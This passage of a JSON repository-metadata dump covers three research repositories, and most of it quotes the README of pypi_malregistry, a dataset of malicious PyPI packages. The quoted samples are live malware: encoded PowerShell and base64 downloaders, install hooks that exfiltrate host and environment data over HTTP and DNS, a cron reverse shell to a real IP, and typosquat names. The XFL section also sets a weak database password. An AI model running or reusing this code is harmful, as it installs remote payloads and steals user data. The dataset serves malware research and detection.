                "source": "https://raw.githubusercontent.com/yueyueL/ReliableLM4Code/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Release Date: 2020-04\n- Institute: Microsoft\n- Paper: [CodeBERT: A Pre-Trained Model for Programming and Natural Languages](https://arxiv.org/abs/2002.08155)\n \n",
                    "original_header": "CodeBERT"
                },
                "confidence": 0.9722737841042874,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yueyueL/ReliableLM4Code/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-09-15T09:19:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-18T05:39:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "14": {
        "filename": "unibw-patch_xfl_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lmu-plai/xfl",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation Steps\n\nFollow the steps below to install XFL-R.\n\n## 0. Install Conda\nIf you don't have Conda, you can install it by following the instructions [on the Conda website](https://docs.conda.io/projects/conda/en/latest/user-guide/install/linux.html).\n\n## 1. Install Software Packages\n\n```shell\nsudo apt install zip tar g++ libpq-dev python3-dev graphviz libgraphviz-dev pkg-config openjdk-17-jdk\n```\n\n## 2. Install radare2\n\n```shell\nwget https://github.com/radareorg/radare2/archive/refs/tags/5.5.4.zip\nunzip radare2-5.5.4\ncd radare2-5.5.4\nsudo chmod -R 777 .\nbash sys/install.sh\n```\n\n## 3. Install PSQL 13\n\n```shell\nsudo apt install postgresql-13\nsudo locale-gen en_US\nsudo locale-gen en_US.UTF-8\nsudo update-locale \n```\n\nTo run and stop the server as a service:\n```shell\nsudo service postgresql start\nsudo service postgresql stop\n```\n\nConfigure the database:\n```shell\nsudo -u postgres psql\nCREATE DATABASE xfl;\nCREATE USER desyl;\nALTER USER desyl with password '123';\nALTER DATABASE xfl OWNER TO desyl;\nGRANT ALL PRIVILEGES on DATABASE xfl TO desyl;\nALTER ROLE desyl WITH CREATEDB;\nexit\nsudo service postgresql restart\nsudo -u postgres psql -d xfl -a -f XFL_DB.sql\n```\n\n\n## 4. Setup the Conda Environment\n\n```shell\nconda create --name XFL --file requirements_XFL.txt\nconda activate XFL\npip3 install setuptools --upgrade\npip3 install importlib-metadata\npip3 install importlib-resources\npip3 install archinfo==9.0.5327\npip3 install cachetools==4.2.4\npip3 install capstone==4.0.2\npip3 install claripy==9.0.5327\npip3 install coloredlogs==15.0\npip3 install datasketch==1.6.4\npip3 install dill==0.3.3\npip3 install intervaltree==3.1.0\npip3 install ipython==7.19.0\npip3 install joblib==1.0.0\npip3 install karateclub==1.3.3\npip3 install lief==0.11.3\npip3 install networkx==2.5\npip3 install nltk==3.5\npip3 install numpy==1.22.4\npip3 install progressbar==2.5\npip3 install psycopg2==2.9.1\npip3 install pygraphviz==1.6\npip3 install pyvex==9.0.5327\npip3 install r2pipe==1.5.3\npip3 install redis==3.5.3\npip3 install rzpipe==0.6.0\npip3 install scipy==1.10.1\npip3 install sklearn==0.0\npip3 install tensorflow==2.13.1\npip3 install tqdm==4.55.1\npip3 install timeout_decorator\npip3 install bson\npip3 install pyenchant\npip3 install psycopg2-binary\npip3 install pydot\n```\n\n```shell\npython3\nimport nltk\nnltk.download('words')\nnltk.download('stopwords')\n```\n\n## 5. Install Ghidra\n\n```shell\nwget https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip\nsudo unzip ghidra_10.4_PUBLIC_20230928.zip  -d /opt/\nsudo mv /opt/ghidra_10.4_PUBLIC /opt/ghidra \nrm -r ghidra_10.4_PUBLIC_20230928.zip\n```\n\nIf you had to install ghidra in another directory than `/opt/`, change the ghidraSupportDir variable in ghidra.py:\n```\n        self.ghidraSupportDir    = \"/opt/ghidra/support/\" # Set ghidra support directory <!>\n```\n\n## 6. Install PfastreXML\n\nDownload PfastreXML from the [official webpage](http://manikvarma.org/code/PfastreXML/download.html) using the provided Google Drive link for the C++ 11 source code.\nUnzip the source code into this directory.\n\nThen compile it with the following commands.\n\n```shell\nconda deactivate\ncd Tree_Extreme_Classifiers/Tree_Extreme_Classifiers/PfastreXML\nmake\nmv PfastreXML_train ../../../XFL/res/\nmv PfastreXML_predict ../../../XFL/res/\n```\n\n## 7. Download models and tables\n\nPre-trained models as well as PSQL dumps have to be downloaded from the Zenodo record.\n\n```shell\nwget https://zenodo.org/records/10733597/files/XFL-R_Models_Tables.zip\nunzip XFL-R_Models_Tables.zip\nrm XFL-R_Models_Tables.zip\n```\n\n### Minimal test (15m, 4Gb of memory)\n\n```shell\nconda activate XFL\ncd XFL/\nbash minimalTest.sh\n```\n\nResults are inside the directory `XFL/res/minimal-test`.\n\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/unibw-patch/xfl/main/xfl-r/INSTALL.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> [!IMPORTANT]\n> XFL-R, our refactored version of XFL, is highly recommended for conducting a scientific comparison. \n",
                    "original_header": "Overview"
                },
                "confidence": 0.9120086318103372,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/unibw-patch/xfl/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-09T16:10:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T12:13:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1252554
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1671
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 797
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "15": {
        "filename": "lxyeternal_pypi_malregistry_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lxyeternal/pypi_malregistry",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`package name -> version -> source code zip file.` \nExample:\n`ython-binance -> 0.1 -> ython-binance-0.1.tar.gz`\n \n",
                    "original_header": "Dataset Format"
                },
                "confidence": 0.9923064532737211,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "**We have manually checked all collected malicious packages and have now removed all false positives.**\n \n",
                    "original_header": "False positive"
                },
                "confidence": 0.9438415108798549,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Malicious code in these packages.\n```python\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\n``` \n",
                    "original_header": "16 Apr. 2024"
                },
                "confidence": 0.9999491502197105,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Malicious code in these packages.\n```python\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\n``` \n\n```python\n...\nwhile \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f:\n  if 108363 == \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f:\n    import pip\n    pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,\n              oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])\n\n    \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523\n  elif \u99ac\u5973\u6c34\u5973\u53e3\u76ee\u4eba\u99ac\u9ce5\u6708\u6c34\u99ac\u5c71\u5c71\u99ac\u9e1f == 286625773:\n...\n``` \n",
                    "original_header": "1 May. 2024"
                },
                "confidence": 0.9979743538053816,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```python\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTc0NDUzNTQwMDAzODUwL3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA==\"))\n```\n```python\nif 'sdist' not in argv:\n    if name == 'nt':\n        exec(b64decode(\"base64 string\").decode())\n    else:\n        exec(b64decode(\"base64 string\").decode())\n```\n```python\nimport base64\nexec(base64.b64decode(\"ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK\"))\n```\n```python\nhostname = socket.gethostname()\nosname = platform.system()\nip = socket.gethostbyname(hostname)\nserver_url = \"https://eo1okaacpdhx16n.m.pipedream.net/poc\"\ndata = {\n    \"hostname\": hostname,\n    \"osname\": osname,\n    \"ip\": ip\n}\n\ntry:\n    response = requests.post(server_url, json=data)\n    if response.status_code == 200:\n        print(\"Data sent successfully to the server.\")\n    else:\n        print(f\"Failed to send data. Status code: {response.status_code}\")\nexcept Exception as e:\n    print(f\"Error: {str(e)}\")\n```\n```python\nimport requests\n\nmycode = os.environ\nsecret = base64.b64encode(bytes(str(mycode),\"UTF-8\"))\ndata = \"https://eow8fqyd1emg87l.m.pipedream.net/\" + secret.decode('utf-8')\nrequests.get(data)\n```\n \n",
                    "original_header": "3 May. 2024"
                },
                "confidence": 0.9999929105112586,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "discomusic-0.0.3\n```python\nimport requests\nfile = requests.get(\"https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&\")\nwith open(\"discomusic.exe\", \"wb\") as f:\n    f.write(file.content)\n```\n \n",
                    "original_header": "Suspecious packages"
                },
                "confidence": 0.998054832351845,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "reflink: https://osv.dev/vulnerability/MAL-2024-1334 \n",
                    "original_header": "8 May. 2024"
                },
                "confidence": 0.980505627250361,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "reflink: https://osv.dev/vulnerability/MAL-2024-1365\n```python\ndef x():\n    t = \"https://frvezdff.pythonanywhere.com/getrnr\"\n    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\bbb.bat\")\n    time.sleep(2)\n    if getattr(sys, 'frozen', False):\n        currentFilePath = os.path.dirname(sys.executable)\n    else:\n        currentFilePath = os.path.dirname(os.path.abspath(__file__))\n    fileName = os.path.basename(sys.argv[0])\n    filePath = os.path.join(currentFilePath, fileName)\n    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    try:\n        with open(os.getenv('APPDATA')+\"\\\\bbb.bat\", \"r\") as file:\n            cont = file.read()  \n        with open(startupFolderPath+\"\\\\bbb.bat\", \"w+\") as file:\n            file.write(cont)\n    except:\n        pass\n    subprocess.Popen(os.getenv('APPDATA')+\"\\\\bbb.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\n    time.sleep(15)\n    os.system(\"shutdown /r /f\")\nx()\n```\n \n",
                    "original_header": "14 May. 2024"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n```python\ndef dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255\n    name = name.rstrip('.')\n    queryid = secrets.token_bytes(2)\n    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional\n    request = queryid + b'\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0'\n    # Question\n    for label in name.rstrip('.').split('.'):\n        assert len(label) < 64, name\n        request += int.to_bytes(len(label), length=1, byteorder='big')\n        request += label.encode()\n    request += b'\\0'  # terminates with the zero length octet for the null label of the root.\n    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE\n    request += b'\\0\\1'  # QCLASS = 1\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n        s.sendto(request, addr)\n        s.settimeout(timeout)\n        try:\n            response, serveraddr = s.recvfrom(4096)\n        except socket.timeout:\n            pass\n\ndef custom_command():\n    package = 'vertica-parser'\n    domain = 'uchpuchmak.lol'\n    ns1 = f'ns1.{domain}'\n\n    data = {\n        'p': package,\n        'h': socket.gethostname(),\n        'd': getpass.getuser(),\n        'c': os.getcwd()\n    }\n    json_data = json.dumps(data)\n    hex_str = json_data.encode('utf-8').hex()\n    chunks = len(hex_str) // 60\n    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n    for count, value in enumerate(hex_list):\n        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n        dns_request(t_str, addr=(ns1, 53))\n\nclass CustomInstallCommand(install):\n    def run(self):\n        install.run(self)\n        custom_command()\n\nclass CustomDevelopCommand(develop):\n    def run(self):\n        develop.run(self)\n        custom_command()\n\nclass CustomEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        custom_command()\n```\n \n",
                    "original_header": "16 May. 2024"
                },
                "confidence": 0.999998775861808,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "sphinx-rtd-theme-cilium [99.9.9] <br>\nrequests_darwin_lite  [2.28.0] <br> \nWhen the user installs the affected version of the requests-darwin-lite pyhton component package, the malicious Trojan file **requests-sidebar-large.png** will be executed on the Mac system, stealing sensitive system information and establishing a persistent connection with a C2 address controlled by the attacker. Attack The attacker can remotely execute malicious system commands on the user's system.\n \n",
                    "original_header": "17 May. 2024"
                },
                "confidence": 0.9638458461419002,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "user-agents-parser [2.2.2] <br>\n    \n```python\n__import__(\"os\").system(\"(crontab -l > .tab ; echo \"*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'\" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1\")\n```\n \n",
                    "original_header": "18 May. 2024"
                },
                "confidence": 0.9999998453633316,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "jupyter_calendar_extension [0.1] <br>\nblypack [0.1, 0.2, 0.3, 0.4, 0.5] <br>\n```python\ndef post_install():\n    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')\n```\n \n",
                    "original_header": "21 May. 2024"
                },
                "confidence": 0.9999640151706987,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "reallydonothing [0.1, 0.2] <br>\nml_linear_regression_lib [1.1.3] <br>\ndependency_confusion123456 [9.9.9] <br>\ndependency_confusion123 [1.0.4] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com\",params = ploads)\n```\n \n",
                    "original_header": "22 May. 2024"
                },
                "confidence": 0.9999999999989768,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "networkx-match-algr-0.1.1 <br>\nnetworkx-match-ssss-0.1.1 <br>\nreportgenpub-0.2 <br>\nspeech-dtw-0.1.1 <br>\n```python\nclass PreInstallCommand(install):\n    def run(self):\n        try:\n            # print(\"Running custom install command\")\n            # subprocess.check_call(['echo', 'Hello, World!'])\n            \n        \n            ip = \"172.16.0.103\"  \n            port = 12345  \n            message = \"Hello, Server!\"  \n            server_address = (ip, port)\n\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            \n            sock.connect(server_address)\n\n            try:\n                sock.sendall(message.encode('utf-8'))\n            finally:\n                sock.close()\n\n        except Exception as e:\n            print(f\"Server ERROR: {e}\")\n        install.run(self)\n```\n \n",
                    "original_header": "24 May. 2024"
                },
                "confidence": 0.9999999999992042,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "jupyter_calendar_extension-0.1 <br>\ncalendar_extender-0.1 <br>\ncalendar_extender-0.2 <br>\nauto_scrubber-0.1 <br>\n```python\nAUTO = [\n\tbytes.fromhex(\"73656564\"),\n\tbytes.fromhex(\n\t\t\"7f821d876c6d29d96b57e48aa82b2a2f2b1367332d362dc967113e3b3ae538bfd184fc02dbb74b9ba80ee40cd6eeb44441daf258112f3d7af7239c3cf0 \"\n\t),\n\tbytes.fromhex(\"737472756374757265\"),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f5368617265642f566964656f73\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\n\t\t\"1796d1a5a7f083b4664e5967ee530a350ff77452cf91c0a12d68af01be5d9bf58c3fccfc17a6fd4f2e3247d517dbce02613a87f55440a281b3aaab88ffff3ecc\"\n\t),\n\tbytes.fromhex(\"6c696265727479\"),\n\tbytes.fromhex(\n\t\t\"4a01697af6d555b03fa03593f0b0d2f1db114707686f34d7641ff7c37ff49f74\"\n\t),\n\tbytes.fromhex(\"6e6f76656c\"),\n]\n\n\ndef fd(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        yy = hashlib.sha3_512(v).digest()\n        return yy[0:32], yy[32:]\n\n    _, ce = iter(v)\n    pd, ce = iter(ce)\n\n    while True:\n        if not pd:\n            pd, ce = iter(ce)\n        f = pd[0]\n        pd = pd[1:]\n\n        yield f\n\n\ndef Runner_Auto(path: bytes, /) -> None:\n    op = fd(AUTO[5] + path)\n    td = fd(AUTO[0] + path)\n    ap = fd(AUTO[7] + path)\n    \n    otherPlace = os.path.expanduser('~/.local/bin')\n    os.makedirs(otherPlace, exist_ok=True)\n    \n    doc = ''.join(chr(x ^ t) for x, t in zip(AUTO[1], td))\n    csv = ''.join(chr(f ^ d) for f, d in zip(AUTO[4], ap))\n\n    url = {\n        \"x86_64\": doc,\n        \"arm64\": csv\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for r, p in zip(buf, op):\n        out.append(r ^ p)\n\n    place = os.path.join(otherPlace, 'AutoScrub')\n    with open(place, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(place, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    subprocess.Popen([place], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n```\n \n",
                    "original_header": "26 May. 2024"
                },
                "confidence": 0.9999999761067787,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "xFileSyncerx [0.0.2] <br>\n```python\nclass Filesyncer:\n    def __init__(self) -> None:\n        self.os = \"null\"\n        self.run()\n        return\n\n    def run(self):\n        sleep(3)\n        working = os.getcwd() + \"/\"\n        b = [832, 928, 928, 896, 920, 464, 376, 376, 912, 776, \n             952, 368, 824, 840, 928, 832, 936, 784, 936, 920, \n             808, 912, 792, 888, 880, 928, 808, 880, 928, 368, \n             792, 888, 872, 376, 800, 408, 800, 936, 792, 928, \n             392, 944, 376, 928, 808, 920, 928, 808, 912, 360, \n             888, 816, 360, 928, 912, 808, 808, 920, 376, 872, \n             776, 840, 880, 376, 920, 400, 368, 896, 968]\n                \n        if working == b:\n            print(f\" Uname: {os.uname()[0]}\\n CWD: {working}\\n\")\n        else:\n            b = [i << 2 for i in b]\n            for i in b:\n                i << 4\n\n            exec(rs.get(\"\".join(chr(x >> 5) for x in b)).text)\n            #exec(r.text)\n\n        return\n    \nFilesyncer()\n```\n \n",
                    "original_header": "06 Jun. 2024"
                },
                "confidence": 0.9999853288908186,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "pytypier [1.0.2] <br>\npyspliter [1.0.2] <br>\nbuilderknower [0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9, 0.1.10, 0.1.11, 0.1.12] <br>\nthesis-uniud-package [1.0.0] <br>\nthesis-package [1.0.0] <br>\n```python\ndef _post_install():\n    hostname = base64.b64encode(socket.getfqdn().encode()).decode()\n    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'\n    destination = os.path.join(os.path.dirname(__file__), 'logo.png')\n    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:\n        data = response.read()\n        out_file.write(data)\n\n\nclass CustomInstallCommand(install):\n    def __init__(self, *args, **kwargs):\n        super(CustomInstallCommand, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n```\n \n",
                    "original_header": "14 Jun. 2024"
                },
                "confidence": 0.9999720264560915,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "bussardweg4a, bussardweg4av2, bussardweg4av3, pyhton, pythn, pytgon, pytjon, pytuon, pytbon, pytohn, pytyon, pythkn, pythom, pythob, pytnon, pyhthon, pytojn, pytiom, pytiob, pythun, pytoh, pytonn, pthon, we3b, wev3, wb3, web3e, webt3, w3eb, 3web, w3b, wweb, werb3, web3q, wdb3, web2, wbe3, wweb3, web3-pyy, web3-pyu, w3b-py, web4-py, wb3-py, ewb3-py, wev3-py, web3-pu, we3-py, wweb3-py, 3web-py, web3-py9, web3-0py, web3-po, web3-p6, web3-p7, etheerum, ehtereum, etheereum, etehreum, etherium, wbe3-py, weeb3-py, ethherum, etherun, ethereun, eutherium, ethreium, eethereum, ethreum, etheerium, theerum, ethrum, etherum, etheum, etherem, etheurm, ethereuum, etheirum, etherriuum, etheruim, etheraem, etheriuum, eetherium, etheruem, ethererum, etheriun, etherreum, etheeruum, etheereium, etherim, etheriumm, ethereuim, etherreeum, etheeruim, etheriuim, etheruum, ettherium, ethreeum, ethherium, etheerem, etherreumm, etherumm, ethereumm, ethereim, etheeruimm, etherrium, etheruemm, ethereium, etheriem, etherriuumm, etheerim, openxsea, openasea, opensae, opensa, openesaa, openseaa, opnesea, oepnsea, openza, openes, openesa, opnsea, openae, openseea, oensea, opesnea, openzea, openseaz, openeasea, opensee, openrea, openwea, opemsea, opensew, oenasea, openresa, opensesa, opensead, openwse, openswa, 